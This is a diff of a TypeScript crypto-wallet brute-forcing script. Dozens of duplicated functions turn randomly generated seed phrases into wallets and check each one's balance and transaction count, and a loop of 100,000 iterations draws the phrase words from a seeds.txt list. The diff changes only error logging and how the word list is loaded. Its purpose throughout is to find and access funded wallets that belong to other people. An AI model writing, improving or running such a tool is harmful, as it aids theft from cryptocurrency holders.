@@ -2665,7 +2655,7 @@ async function s162(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s163(mnemonic: string, db: any): Promise<void> {
@@ -2681,7 +2671,7 @@ async function s163(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s164(mnemonic: string, db: any): Promise<void> {
@@ -2697,7 +2687,7 @@ async function s164(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s165(mnemonic: string, db: any): Promise<void> {
@@ -2713,7 +2703,7 @@ async function s165(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s166(mnemonic: string, db: any): Promise<void> {
@@ -2729,7 +2719,7 @@ async function s166(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s167(mnemonic: string, db: any): Promise<void> {
@@ -2745,7 +2735,7 @@ async function s167(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s168(mnemonic: string, db: any): Promise<void> {
@@ -2761,7 +2751,7 @@ async function s168(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s169(mnemonic: string, db: any): Promise<void> {
@@ -2777,7 +2767,7 @@ async function s169(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s170(mnemonic: string, db: any): Promise<void> {
@@ -2793,7 +2783,7 @@ async function s170(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s171(mnemonic: string, db: any): Promise<void> {
@@ -2809,7 +2799,7 @@ async function s171(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s172(mnemonic: string, db: any): Promise<void> {
@@ -2825,7 +2815,7 @@ async function s172(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s173(mnemonic: string, db: any): Promise<void> {
@@ -2841,7 +2831,7 @@ async function s173(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s174(mnemonic: string, db: any): Promise<void> {
@@ -2857,7 +2847,7 @@ async function s174(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s175(mnemonic: string, db: any): Promise<void> {
@@ -2873,7 +2863,7 @@ async function s175(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s176(mnemonic: string, db: any): Promise<void> {
@@ -2889,7 +2879,7 @@ async function s176(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s177(mnemonic: string, db: any): Promise<void> {
@@ -2905,7 +2895,7 @@ async function s177(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s178(mnemonic: string, db: any): Promise<void> {
@@ -2921,7 +2911,7 @@ async function s178(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
 
   }
 }
@@ -2938,7 +2928,7 @@ async function s179(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s180(mnemonic: string, db: any): Promise<void> {
@@ -2954,7 +2944,7 @@ async function s180(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s181(mnemonic: string, db: any): Promise<void> {
@@ -2970,7 +2960,7 @@ async function s181(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s182(mnemonic: string, db: any): Promise<void> {
@@ -2986,7 +2976,7 @@ async function s182(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s183(mnemonic: string, db: any): Promise<void> {
@@ -3002,7 +2992,7 @@ async function s183(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s184(mnemonic: string, db: any): Promise<void> {
@@ -3018,7 +3008,7 @@ async function s184(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s185(mnemonic: string, db: any): Promise<void> {
@@ -3034,7 +3024,7 @@ async function s185(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s186(mnemonic: string, db: any): Promise<void> {
@@ -3050,7 +3040,7 @@ async function s186(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s187(mnemonic: string, db: any): Promise<void> {
@@ -3066,7 +3056,7 @@ async function s187(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s188(mnemonic: string, db: any): Promise<void> {
@@ -3082,7 +3072,7 @@ async function s188(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s189(mnemonic: string, db: any): Promise<void> {
@@ -3098,7 +3088,7 @@ async function s189(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s190(mnemonic: string, db: any): Promise<void> {
@@ -3114,7 +3104,7 @@ async function s190(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s191(mnemonic: string, db: any): Promise<void> {
@@ -3130,7 +3120,7 @@ async function s191(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s192(mnemonic: string, db: any): Promise<void> {
@@ -3146,7 +3136,7 @@ async function s192(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s193(mnemonic: string, db: any): Promise<void> {
@@ -3162,7 +3152,7 @@ async function s193(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s194(mnemonic: string, db: any): Promise<void> {
@@ -3178,7 +3168,7 @@ async function s194(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s195(mnemonic: string, db: any): Promise<void> {
@@ -3194,7 +3184,7 @@ async function s195(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s196(mnemonic: string, db: any): Promise<void> {
@@ -3210,7 +3200,7 @@ async function s196(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s197(mnemonic: string, db: any): Promise<void> {
@@ -3226,7 +3216,7 @@ async function s197(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s198(mnemonic: string, db: any): Promise<void> {
@@ -3242,7 +3232,7 @@ async function s198(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s199(mnemonic: string, db: any): Promise<void> {
@@ -3258,7 +3248,7 @@ async function s199(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s200(mnemonic: string, db: any): Promise<void> {
@@ -3274,7 +3264,7 @@ async function s200(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s201(mnemonic: string, db: any): Promise<void> {
@@ -3290,7 +3280,7 @@ async function s201(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s202(mnemonic: string, db: any): Promise<void> {
@@ -3306,7 +3296,7 @@ async function s202(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s203(mnemonic: string, db: any): Promise<void> {
@@ -3322,7 +3312,7 @@ async function s203(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s204(mnemonic: string, db: any): Promise<void> {
@@ -3338,7 +3328,7 @@ async function s204(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s205(mnemonic: string, db: any): Promise<void> {
@@ -3354,7 +3344,7 @@ async function s205(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s206(mnemonic: string, db: any): Promise<void> {
@@ -3370,7 +3360,7 @@ async function s206(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s207(mnemonic: string, db: any): Promise<void> {
@@ -3386,7 +3376,7 @@ async function s207(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s208(mnemonic: string, db: any): Promise<void> {
@@ -3402,7 +3392,7 @@ async function s208(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s209(mnemonic: string, db: any): Promise<void> {
@@ -3418,7 +3408,7 @@ async function s209(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s210(mnemonic: string, db: any): Promise<void> {
@@ -3434,7 +3424,7 @@ async function s210(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s211(mnemonic: string, db: any): Promise<void> {
@@ -3450,7 +3440,7 @@ async function s211(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s212(mnemonic: string, db: any): Promise<void> {
@@ -3466,7 +3456,7 @@ async function s212(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s213(mnemonic: string, db: any): Promise<void> {
@@ -3482,7 +3472,7 @@ async function s213(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s214(mnemonic: string, db: any): Promise<void> {
@@ -3498,7 +3488,7 @@ async function s214(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s215(mnemonic: string, db: any): Promise<void> {
@@ -3514,7 +3504,7 @@ async function s215(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s216(mnemonic: string, db: any): Promise<void> {
@@ -3530,7 +3520,7 @@ async function s216(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s217(mnemonic: string, db: any): Promise<void> {
@@ -3546,7 +3536,7 @@ async function s217(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s218(mnemonic: string, db: any): Promise<void> {
@@ -3562,7 +3552,7 @@ async function s218(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s219(mnemonic: string, db: any): Promise<void> {
@@ -3578,7 +3568,7 @@ async function s219(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 
@@ -3602,12 +3592,9 @@ function getRandomMnemonic(wordsArray: string[], wordCount = 12): string {
 
 let timeout = 10000; // 10 seconds
 const db: any = await connectDB();
-const wordsArray = await db
-  .collection("seeds")
-  .find()
-  .toArray()
-  .then((docs) => docs.map((doc) => doc.word));
 
+const data:any = await fs.readFileSync('seeds.txt', 'utf-8');
+const wordsArray = data.split(/\r?\n/);
 for (let index = 0; index < 100000; index++) {
   try {
     setTimeout(() => {
